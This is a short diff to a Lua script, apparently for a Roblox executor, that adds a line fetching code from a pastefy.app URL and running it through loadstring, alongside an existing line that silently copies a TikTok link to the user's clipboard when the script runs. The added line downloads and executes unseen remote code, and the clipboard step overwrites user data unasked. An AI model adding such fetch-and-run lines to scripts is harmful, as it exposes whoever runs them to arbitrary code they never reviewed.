@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://pastefy.app/Ap0k5O0t/raw"))()
+
+--script
+
 -- 📌 Auto copy TikTok link on script execution
 setclipboard("https://www.tiktok.com/@developervn11?_t=ZS-8yW9cZdXeQD&_r=1")
 
